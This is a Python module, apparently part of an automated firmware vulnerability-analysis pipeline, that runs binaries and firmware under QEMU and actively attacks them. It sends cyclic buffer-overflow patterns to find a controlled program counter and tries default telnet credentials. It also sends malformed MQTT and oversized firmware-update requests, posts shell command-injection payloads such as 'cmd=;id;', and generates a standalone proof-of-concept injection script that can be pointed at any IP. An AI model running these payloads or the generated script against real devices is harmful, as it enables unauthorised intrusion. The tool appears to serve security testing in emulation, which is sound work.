"""
Stage 3a/3b — QEMU user-mode and system-mode harness.

Attempts active exploitation of candidates from the Ghidra priority queue.
Goal: controlled PC overwrite (PC == 0x41414141) or information disclosure.
"""

import os
import re
import shutil
import signal
import subprocess
import tempfile
import time
from typing import List, Optional

from models import Finding


_CYCLIC_ALPHABET = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"


def _cyclic(length: int) -> bytes:
    """Generate a de Bruijn sequence of given length."""
    try:
        from pwn import cyclic  # type: ignore
        return cyclic(length)
    except ImportError:
        # Fallback simple cyclic pattern
        pattern = b""
        for i in range(length):
            c = _CYCLIC_ALPHABET[i % len(_CYCLIC_ALPHABET)]
            pattern += bytes([c])
        return pattern


def _cyclic_find(subseq: bytes) -> int:
    """Find offset of subseq in cyclic pattern."""
    try:
        from pwn import cyclic_find  # type: ignore
        return cyclic_find(subseq)
    except ImportError:
        return -1


def _run_process(cmd: list, input_data: bytes = None,
                 timeout: int = 60, env: dict = None,
                 cwd: str = None) -> tuple:
    """Run subprocess, return (stdout+stderr, returncode)."""
    try:
        env = env or dict(os.environ)
        r = subprocess.run(
            cmd, input=input_data, capture_output=True,
            timeout=timeout, cwd=cwd, env=env,
        )
        out = (r.stdout + r.stderr).decode(errors="replace")
        return out, r.returncode
    except subprocess.TimeoutExpired:
        return "[timeout]", -1
    except FileNotFoundError:
        return f"[not found: {cmd[0]}]", -1
    except Exception as exc:
        return f"[error: {exc}]", -1


def _is_crash(out: str, rc: int) -> bool:
    """Detect if output indicates a crash."""
    crash_signals = [
        "Segmentation fault", "SIGSEGV", "SIGBUS", "SIGABRT",
        "core dumped", "Illegal instruction", "SIGILL",
        "stack smashing detected",
    ]
    return rc in (-11, -6, -4, 139, 134) or any(s in out for s in crash_signals)


def _controlled_pc(out: str) -> Optional[str]:
    """Check for controlled PC (0x41414141 pattern)."""
    patterns = [
        r"PC\s*=\s*(0x[0-9a-fA-F]+)",
        r"ip\s+(0x[0-9a-fA-F]+)",
        r"EIP\s+(0x[0-9a-fA-F]+)",
        r"RIP\s+(0x[0-9a-fA-F]+)",
    ]
    for pat in patterns:
        m = re.search(pat, out, re.IGNORECASE)
        if m:
            addr = m.group(1)
            # Check if it contains our cyclic pattern bytes
            if "0x41" in addr or "0x4141" in addr or "AAAA" in addr:
                return addr
    return None


# ── QEMU user-mode ────────────────────────────────────────────────────────────

def run_qemu_user(path: str, candidate: Finding, triage,
                  qemu_bin: str, timeout: int = 60) -> List[Finding]:
    """
    Run binary under QEMU user-mode.
    Attempt exploitation of a single candidate finding.
    Returns list of new dynamic Findings.
    """
    findings = []
    info = triage.binary_info

    # Build sysroot argument
    sysroot_args = []
    if triage.has_filesystem and triage.extracted_path:
        sysroot_args = ["-L", triage.extracted_path]

    base_cmd = [qemu_bin] + sysroot_args + [path]

    # Step 1: Baseline run with strace to identify input paths
    if shutil.which("strace"):
        strace_out, _ = _run_process(
            ["strace", "-f", "-e", "trace=read,write,recv,send,open,execve"]
            + [qemu_bin] + sysroot_args + [path],
            timeout=15,
        )
        input_paths = _extract_input_paths(strace_out)
    else:
        input_paths = ["stdin"]

    # Step 1b: ltrace to capture dangerous libc call sites (Gap 11)
    if shutil.which("ltrace"):
        ltrace_out, _ = _run_process(
            ["ltrace", "-e", "strcpy+strcat+gets+memcpy+sprintf+system+popen",
             qemu_bin] + sysroot_args + [path],
            timeout=15,
        )
        _extract_ltrace_findings(ltrace_out, findings, path)

    # Step 2: Try each input path with cyclic pattern
    for input_path in input_paths[:3]:
        payload = _cyclic(512)
        crash_out, rc = _run_process(base_cmd, input_data=payload, timeout=timeout)

        if not _is_crash(crash_out, rc):
            # Try larger payload
            payload = _cyclic(1024)
            crash_out, rc = _run_process(base_cmd, input_data=payload, timeout=timeout)

        if _is_crash(crash_out, rc):
            ctrl_pc = _controlled_pc(crash_out)
            sev = candidate.severity
            conf = "PLAUSIBLE"

            if ctrl_pc:
                conf = "CONFIRMED" if "4141" in ctrl_pc or "4242" in ctrl_pc else "PLAUSIBLE"
                sev = "CRITICAL"

            # Try to find offset
            offset = _find_crash_offset(path, qemu_bin, sysroot_args, timeout)

            trace = crash_out[:2000]
            steps = [
                f"qemu-{triage.arch} {('-L ' + triage.extracted_path) if triage.extracted_path else ''} {path}",
                f"Send {len(payload)}-byte cyclic pattern via {input_path}",
                f"Observe crash: rc={rc}",
            ]
            if offset > 0:
                steps.append(f"Cyclic offset to PC: {offset} bytes")

            f = Finding(
                id="",  # assigned by _next_id in re_agent
                stage="dynamic",
                title=f"QEMU crash: {candidate.title} [{input_path}]",
                cwe=candidate.cwe,
                severity=sev,
                component=candidate.component,
                evidence=f"Crash at rc={rc}  controlled_pc={ctrl_pc or 'unknown'}  "
                         f"offset={offset if offset > 0 else '?'}",
                confirmation=conf,
                emulation_trace=trace,
                exploit_score=0.9 if conf == "CONFIRMED" else 0.6,
                manual_steps=steps,
                runtime_test_hint=f"Repeat with GDB: gdb-multiarch {path}, run with cyclic payload",
                address=candidate.address,
                function_name=candidate.function_name,
            )
            if offset > 0:
                f.emulation_trace += f"\n[cyclic offset] {offset}"
            findings.append(f)
            break  # One crash per candidate is enough

    return findings


def _extract_ltrace_findings(ltrace_out: str, findings: List[Finding], path: str) -> None:
    """Gap 11: Parse ltrace output for dangerous libc calls and emit Findings."""
    dangerous = {
        "gets(":    ("CWE-120", "CRITICAL", "Unbounded gets() call at runtime"),
        "strcpy(":  ("CWE-120", "HIGH",     "Unsafe strcpy() call at runtime"),
        "strcat(":  ("CWE-120", "HIGH",     "Unsafe strcat() call at runtime"),
        "sprintf(": ("CWE-134", "HIGH",     "Unsafe sprintf() call at runtime"),
        "system(":  ("CWE-78",  "CRITICAL", "system() called at runtime"),
        "popen(":   ("CWE-78",  "HIGH",     "popen() called at runtime"),
    }
    import re as _re
    for fn_sig, (cwe, sev, title) in dangerous.items():
        if fn_sig in ltrace_out:
            # Extract up to 200 chars of context around the call
            idx = ltrace_out.find(fn_sig)
            snippet = ltrace_out[max(0, idx - 40):idx + 120]
            findings.append(Finding(
                id="", stage="dynamic",
                title=f"ltrace: {title}",
                cwe=cwe, severity=sev,
                component=f"binary:{fn_sig.rstrip('(')}",
                evidence=f"ltrace baseline: {snippet.strip()[:200]}",
                confirmation="PLAUSIBLE",
                manual_steps=[
                    f"ltrace -e {fn_sig.rstrip('(')} {path}",
                    "Provide attacker-controlled input and observe call arguments",
                ],
            ))


def _extract_input_paths(strace_out: str) -> List[str]:
    """Parse strace output to find where the process reads input."""
    paths = ["stdin"]
    # Look for open() calls on interesting files
    open_re = re.compile(r'open(?:at)?\("([^"]+)"')
    for m in open_re.finditer(strace_out):
        fp = m.group(1)
        if any(x in fp for x in ["/dev/", "/proc/", "libc", ".so"]):
            continue
        paths.append(fp)
    return paths[:5]


def _find_crash_offset(path: str, qemu_bin: str, sysroot_args: list,
                        timeout: int) -> int:
    """Binary search for exact overflow offset using cyclic patterns."""
    for size in [64, 128, 256, 512]:
        payload = _cyclic(size)
        out, rc = _run_process(
            [qemu_bin] + sysroot_args + [path],
            input_data=payload, timeout=timeout,
        )
        if _is_crash(out, rc):
            # Try to extract overwritten address from crash output
            pc_re = re.compile(r"(?:PC|EIP|RIP|ip)\s*[=:]\s*(0x[0-9a-fA-F]+)", re.I)
            m = pc_re.search(out)
            if m:
                addr_hex = m.group(1)
                try:
                    addr_bytes = bytes.fromhex(addr_hex.replace("0x", "").zfill(8))
                    offset = _cyclic_find(addr_bytes[:4])
                    if offset >= 0:
                        return offset
                except Exception:
                    pass
            return size - 8  # fallback estimate
    return -1


# ── QEMU system-mode ──────────────────────────────────────────────────────────

def run_qemu_system(path: str, triage, candidates: List[Finding],
                    timeout: int = 180) -> List[Finding]:
    """
    Boot firmware in QEMU system-mode and attack live services.
    Returns dynamic findings from service-level exploitation attempts.
    """
    findings = []
    arch = triage.arch

    # Determine machine type
    machine_map = {
        "arm":   "virt", "arm64": "virt", "mips": "malta",
        "x86":   "pc",   "x86_64": "pc",
    }
    machine = machine_map.get(arch, "virt")
    qemu_sys = f"qemu-system-{arch if arch != 'arm64' else 'aarch64'}"

    if not shutil.which(qemu_sys):
        return []

    # Build QEMU system command (simplified — real targets need machine-specific args)
    kernel = triage.extracted_path + "/boot/vmlinuz" if triage.extracted_path else path
    if not os.path.exists(kernel):
        kernel = path

    cmd = [
        qemu_sys,
        "-M", machine,
        "-nographic",
        "-m", "256M",
        "-kernel", kernel,
        "-append", "root=/dev/ram console=ttyAMA0 panic=1",
    ]

    # Launch QEMU system in background and probe services
    proc = None
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )
        time.sleep(15)  # Wait for boot

        if proc.poll() is not None:
            return []  # Boot failed

        # Probe common ports
        findings.extend(_probe_services(candidates, triage, timeout=30))

    except Exception:
        pass
    finally:
        if proc and proc.poll() is None:
            proc.send_signal(signal.SIGTERM)
            try:
                proc.wait(timeout=5)
            except Exception:
                proc.kill()

    return findings


def _probe_services(candidates: List[Finding], triage, timeout: int) -> List[Finding]:
    """Attempt to probe/attack common services on localhost."""
    findings = []
    import socket

    ports_to_probe = [80, 443, 23, 22, 8080, 8443, 1883]
    for port in ports_to_probe:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if s.connect_ex(("127.0.0.1", port)) == 0:
                s.close()
                if port in (80, 8080):
                    f = _try_http_injection(port, candidates)
                    if f:
                        findings.append(f)
                    # Also try update handler overflow
                    f2 = _try_update_handler(port)
                    if f2:
                        findings.append(f2)
                elif port == 23:
                    fs = _try_telnet_login(port)
                    findings.extend(fs)
                elif port == 1883:
                    fs = _try_mqtt_inject(port)
                    findings.extend(fs)
                elif port in (443, 8443):
                    f = _try_http_injection(port, candidates)
                    if f:
                        findings.append(f)
            else:
                s.close()
        except Exception:
            pass
    return findings


def _try_telnet_login(port: int) -> List[Finding]:
    """Gap 10: Try default credentials on telnet service."""
    import socket
    findings = []
    default_creds = [
        (b"admin\r\n", b"admin\r\n"),
        (b"root\r\n",  b"root\r\n"),
        (b"admin\r\n", b"password\r\n"),
        (b"root\r\n",  b"\r\n"),
    ]
    for user, passwd in default_creds:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect(("127.0.0.1", port))
            banner = s.recv(512).decode(errors="replace")
            s.send(user)
            time.sleep(0.5)
            s.recv(256)
            s.send(passwd)
            time.sleep(0.5)
            resp = s.recv(512).decode(errors="replace")
            s.close()
            # Login success heuristic: shell prompt or no "Login incorrect"
            if any(ind in resp for ind in ["$", "#", ">", "~"]) and \
               "incorrect" not in resp.lower() and "failed" not in resp.lower():
                findings.append(Finding(
                    id="", stage="dynamic",
                    title=f"Default credentials accepted on telnet port {port}",
                    cwe="CWE-1392", severity="CRITICAL",
                    component=f"network:telnet:{port}",
                    evidence=f"Telnet login with {user.strip()!r}/{passwd.strip()!r} succeeded; banner: {banner[:100]}",
                    confirmation="CONFIRMED",
                    disposition="RESOLVED",
                    poc_script=f"# telnet 127.0.0.1 {port}\n# login: {user.decode().strip()}\n# password: {passwd.decode().strip()}",
                    manual_steps=[
                        f"telnet target {port}",
                        f"Login: {user.decode().strip()} / {passwd.decode().strip()}",
                    ],
                ))
                break
        except Exception:
            pass
    return findings


def _try_mqtt_inject(port: int) -> List[Finding]:
    """Gap 10: Send malformed MQTT CONNECT packet to detect parser vulnerabilities."""
    import socket
    findings = []
    # Oversized MQTT CONNECT with client ID > 65535 bytes
    client_id = b"A" * 65500
    # MQTT CONNECT packet with inflated length
    connect_pkt = (
        b"\x10"           # CONNECT packet type
        + b"\x82\x80\x04" # Remaining length = 65538 (malformed variable-length)
        + b"\x00\x04MQTT" # Protocol name
        + b"\x04"         # Protocol level (3.1.1)
        + b"\x02"         # Connect flags (clean session)
        + b"\x00\x3c"     # Keepalive = 60
        + b"\x00" + bytes([len(client_id) >> 8, len(client_id) & 0xFF])
        + client_id
    )
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect(("127.0.0.1", port))
        s.send(connect_pkt)
        resp = s.recv(256).decode(errors="replace")
        s.close()
        findings.append(Finding(
            id="", stage="dynamic",
            title=f"MQTT broker on port {port} — oversized client ID injection",
            cwe="CWE-120", severity="HIGH",
            component=f"network:mqtt:{port}",
            evidence=f"Sent 65500-byte MQTT client ID; response: {resp[:200]}",
            confirmation="PLAUSIBLE",
            runtime_test_hint="Attach Wireshark + GDB; resend oversized CONNECT on real device",
            manual_steps=[
                "Use mqtt-pwn or manual socket to send oversized CONNECT packet",
                "Monitor broker for crash or abnormal disconnect",
            ],
        ))
    except Exception:
        pass
    return findings


def _try_update_handler(port: int) -> Optional[Finding]:
    """Gap 10: Try large/malformed update payload against HTTP update handler."""
    import socket
    update_paths = ["/update", "/firmware", "/upgrade", "/ota", "/admin/update"]
    for upath in update_paths:
        try:
            payload = b"firmware=" + b"A" * 8192
            request = (
                f"POST {upath} HTTP/1.0\r\n"
                f"Host: 127.0.0.1:{port}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(payload)}\r\n\r\n"
            ).encode() + payload
            s = socket.socket()
            s.settimeout(5)
            s.connect(("127.0.0.1", port))
            s.send(request)
            resp = s.recv(2048).decode(errors="replace")
            s.close()
            if any(ind in resp for ind in ["500", "Segfault", "error"]):
                return Finding(
                    id="", stage="dynamic",
                    title=f"Update handler overflow on {upath}:{port}",
                    cwe="CWE-120", severity="HIGH",
                    component=f"http://127.0.0.1:{port}{upath}",
                    evidence=f"8KB firmware POST to {upath} → {resp[:200]}",
                    confirmation="PLAUSIBLE",
                    manual_steps=[
                        f"curl -X POST http://target:{port}{upath} -d 'firmware=AAAA...' (8192 bytes)",
                        "Monitor for crash / 500 response",
                    ],
                )
        except Exception:
            pass
    return None


def _try_http_injection(port: int, candidates: List[Finding]) -> Optional[Finding]:
    """Try command injection via HTTP request body."""
    import socket
    payloads = [
        b"cmd=;id;",
        b"cmd=$(id)",
        b"input=" + b"A" * 512,
        b"data=" + _cyclic(256),
    ]
    for payload in payloads:
        request = (
            f"POST / HTTP/1.0\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(payload)}\r\n\r\n"
        ).encode() + payload
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect(("127.0.0.1", port))
            s.send(request)
            resp = s.recv(4096).decode(errors="replace")
            s.close()
            if "uid=" in resp:
                return Finding(
                    id="", stage="dynamic",
                    title=f"Command injection confirmed via HTTP port {port}",
                    cwe="CWE-78", severity="CRITICAL",
                    component=f"http://127.0.0.1:{port}/",
                    evidence=f"Response contains uid=: {resp[:200]}",
                    confirmation="CONFIRMED",
                    poc_script=_http_injection_poc(port, payload),
                    poc_output=resp[:500],
                    manual_steps=[
                        f"curl -X POST http://target:{port}/ -d '{payload.decode()}'",
                        "Observe uid= in response (command executed)",
                    ],
                    disposition="RESOLVED",
                )
        except Exception:
            pass
    return None


def _http_injection_poc(port: int, payload: bytes) -> str:
    return f"""#!/usr/bin/env python3
# Command injection PoC via HTTP
# Usage: python3 <this_file> [--target IP] [--port {port}]

import argparse, socket

parser = argparse.ArgumentParser()
parser.add_argument("--target", default="127.0.0.1")
parser.add_argument("--port", type=int, default={port})
args = parser.parse_args()

payload = b{repr(payload)}
request = (
    f"POST / HTTP/1.0\\r\\n"
    f"Host: {{args.target}}:{{args.port}}\\r\\n"
    f"Content-Type: application/x-www-form-urlencoded\\r\\n"
    f"Content-Length: {{len(payload)}}\\r\\n\\r\\n"
).encode() + payload

s = socket.socket()
s.connect((args.target, args.port))
s.send(request)
resp = s.recv(4096).decode(errors="replace")
print("[*] Response:")
print(resp)
if "uid=" in resp:
    print("[+] SUCCESS: command injection confirmed")
else:
    print("[-] uid= not found in response")
"""
